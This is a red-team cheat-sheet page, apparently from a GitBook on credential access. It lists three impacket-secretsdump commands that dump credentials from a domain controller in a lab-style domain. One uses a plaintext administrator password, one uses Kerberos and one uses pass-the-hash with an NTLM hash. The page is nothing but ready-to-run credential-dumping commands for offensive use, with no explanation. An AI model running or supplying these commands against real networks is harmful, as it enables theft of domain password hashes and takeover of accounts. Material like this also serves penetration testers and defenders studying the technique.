---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/secretsdump
---

# Secretsdump

```python
impacket-secretsdump vulnableone.local/administrator:Password123@10.10.10.10
impacket-secretsdump dc01.vulnableone.local -dc-ip 10.10.10.10 -just-dc-user 'vulnableone\administrator' -k -no-pass
impacket-secretsdump vulnableone.local/administrator@10.10.10.10 -hashes :c0e64f399874448ff73f3f7345b8cde4 
```
